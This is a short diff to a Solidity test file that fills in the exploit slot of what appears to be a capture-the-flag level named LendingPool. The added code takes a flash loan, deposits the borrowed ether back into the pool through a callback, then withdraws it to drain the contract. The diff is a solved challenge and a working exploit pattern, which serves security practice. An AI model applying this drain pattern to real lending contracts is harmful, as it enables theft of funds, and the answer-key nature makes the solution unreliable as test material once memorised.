@@ -8,14 +8,20 @@ import "src/08_LendingPool/LendingPool.sol";
 contract LendingPoolTest is BaseTest {
     LendingPool instance;
 
+    function execute() external payable {
+        instance.deposit{value: 0.1 ether}();
+    }
+
     function setUp() public override {
         super.setUp();
         instance = new LendingPool{value: 0.1 ether}();
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        this.execute();
+        instance.flashLoan(0.1 ether);
 
+        instance.withdraw();
         checkSuccess();
     }
 
